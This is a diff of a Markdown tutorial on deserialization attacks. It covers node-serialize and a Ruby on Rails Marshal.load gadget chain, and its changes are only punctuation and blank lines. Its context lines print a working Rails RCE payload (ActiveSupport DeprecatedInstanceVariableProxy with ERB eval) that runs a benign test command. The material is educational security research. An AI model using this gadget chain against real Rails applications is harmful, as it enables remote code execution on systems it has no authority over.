@@ -2006,7 +2006,7 @@ The first NodeJS module we'll analyse is `node-serialize`. In 2017, a researcher
 
 If you test it, you'll find out that `node-serialize` serializes objects using regular JSON format. The question that may arise is, why not JSON.stringify(), then? The reason being that JSON cannot really serialize functions.
 
-For this reason, if an object containing a functional literal, is serialized with `JSON.stringify`, the literal would be lost:
+For this reason, if an object containing a functional literal is serialized with `JSON.stringify`, the literal would be lost:
 
 ```js
 node -e "console.log(JSON.stringify({'a':function(){console.log('HELLO!');}}));"
@@ -2393,6 +2393,7 @@ Originally, this vulnerability was found by **Charlie Somerville** during a rese
 The above fallbacks doesn't affect the payload from working within Ruby on Rails app, as the requirements are easily fulfilled. However, they would be show stoppers for any other Ruby Application. If you want to test it, you can use the following command, seeing that it works only if we previously load `rails/all`:
 
 * Without `require 'rails/all'`
+
 ```bash
 $ ruby -e 'Marshal.load("\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\"\u0018eval(`puts \"TEST\"`)\u0006:\u0006ET:\f@method:\vresult")'
 
@@ -2401,6 +2402,7 @@ Traceback (most recent call last):
 -e:1:in `load': undefined class/module ActiveSupport:: (ArgumentError)
 ```
 * With `require 'rails/all'`
+
 ```bash
 $ ruby -e 'require "rails/all";Marshal.load("\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\u0006:\t@srcI\"\u0018eval(`puts \"TEST\"`)\u0006:\u0006ET:\f@method:\vresult")'
 
